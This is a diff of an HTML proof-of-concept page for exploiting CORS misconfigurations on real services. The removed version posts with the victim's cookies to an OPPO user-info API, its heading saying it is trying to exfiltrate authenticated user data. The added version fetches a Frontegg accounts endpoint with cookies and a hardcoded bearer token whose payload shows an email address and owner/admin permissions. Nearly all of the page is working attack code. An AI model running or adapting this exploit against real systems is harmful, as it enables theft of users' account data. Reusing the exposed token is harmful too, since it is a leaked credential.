@@ -1,36 +1,26 @@
-<!-- cors-poc.html -->
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>OPPO CORS Misconfiguration PoC</title>
-  <style>
-    body { font-family: sans-serif; padding: 2rem; background: #f9f9f9; }
-    pre { background: #eee; padding: 1rem; white-space: pre-wrap; }
-  </style>
+  <title>CORS Exploit PoC</title>
 </head>
 <body>
-  <h2>🔐 OPPO CORS Misconfiguration Exploit</h2>
-  <p>Attempting to exfiltrate authenticated user info from OPPO API...</p>
-  <pre id="result">Loading...</pre>
+  <h1>CORS Exploit PoC</h1>
+  <pre id="output">Loading...</pre>
 
   <script>
-    fetch("https://opsg-gateway-in.oppo.com/v2/api/rest/mall/user/info/fetch", {
-      method: "POST",
-      credentials: "include",
+    fetch("https://frontegg-prod.au.frontegg.com/vendors/resources/accounts/v1", {
+      method: "GET",
+      credentials: "include", // send cookies
       headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        storeViewCode: "in"
-      })
+        "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ijg2NzQ0ZDE1In0.eyJzdWIiOiIzOTQ2NDQzYi1lMDhlLTQ5ZGMtODY1Ny0xOWY4MjVlZGIxZDEiLCJuYW1lIjoiYnJ1dGUiLCJlbWFpbCI6ImRpZGV4aTE3MzdAZGV2ZGlncy5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwibWV0YWRhdGEiOnt9LCJyb2xlcyI6WyJvd25lciIsImFkbWluIl0sInBlcm1pc3Npb25zIjpbImRwLioiLCJmZS5zZWN1cmUuKiIsImZlLmNvbm5lY3Rpdml0eS4qIiwiZHAuYXBwbGljYXRpb25zLnJlYWQuYXBwIiwiZHAuYXBwbGljYXRpb25zLmRlbGV0ZS5hcHAiLCJmZS5hY2NvdW50LXNldHRpbmdzLnJlYWQuYXBwIiwiZHAuZW50aXRsZW1lbnRzLioiXSwidGVuYW50SWQiOiJmNTRjNTFkYS05MTRmLTQ0NDItYTA1Yy0zNDE2MGJkOWZlMzIiLCJ0ZW5hbnRJZHMiOlsiZjU0YzUxZGEtOTE0Zi00NDQyLWEwNWMtMzQxNjBiZDlmZTMyIl0sInByb2ZpbGVQaWN0dXJlVXJsIjoiaHR0cHM6Ly93d3cuZ3JhdmF0YXIuY29tL2F2YXRhci84M2IwMTE5MTExOWZkMDIyMDkyYzAxMWU0ODRiNzU4OD9kPWh0dHBzOi8vdWktYXZhdGFycy5jb20vYXBpL2JydXRlLzEyOC9yYW5kb20iLCJzaWQiOiI0MmNhNzBmMi1jZTI3LTQzN2ItYmQ1ZC1iNzgzODBhZTM0YjgiLCJ0eXBlIjoidXNlclRva2VuIiwiYXBwbGljYXRpb25JZCI6Ijc2NTc1Y2RkLTNkNWQtNDBiMC1iMTdjLWJjZGRjZmZkYjcxNSIsInNhbWxBdHRyaWJ1dGVzIjpudWxsLCJjdXN0b21DbGFpbXMiOnsiYWNjb3VudEVudmlyb25tZW50cyI6W3siaWQiOiJlNGI1YzgyNi0zYTIwLTQ3YjUtOTA5My0xYjI5NmRiNTQ3MzMiLCJjcmVhdGVkQXQiOiIyMDI1LTA3LTI5VDExOjA5OjA5LjAwMFoiLCJlbnZpcm9ubWVudCI6ImRldmVsb3BtZW50IiwiZW52aXJvbm1lbnROYW1lIjoiZGV2ZWxvcG1lbnQifV19LCJhdWQiOiI4Njc0NGQxNS0zOTcwLTRjYTEtODJlOS0yY2QyODE3Mjg2MjQiLCJpc3MiOiJodHRwczovL2Zyb250ZWdnLXByb2QuYXUuZnJvbnRlZ2cuY29tIiwiaWF0IjoxNzUzNzg3OTU1LCJleHAiOjE3NTM4NzQzNTV9.U6TZEqHoysuCGMIHwoPNttmcx9KllRqwGB0jXIf2uXr-ziDC8fXvNRwYjUdPrQMu1Zqe8RD5Ej7ELrclzpUBX7AXLn6CUXFWkDD2V9yvl6hMj7Ymp10VZZaZkrABeOiSMv9EC-iNiyf_CRGFDvYBxDLP7ODg7yJl5sI_wvrc4Ks"
+      }
     })
     .then(res => res.json())
     .then(data => {
-      document.getElementById("result").textContent = JSON.stringify(data, null, 2);
+      document.getElementById("output").textContent = JSON.stringify(data, null, 2);
     })
     .catch(err => {
-      document.getElementById("result").textContent = "Error: " + err;
+      document.getElementById("output").textContent = "Request blocked or failed: " + err;
     });
   </script>
 </body>
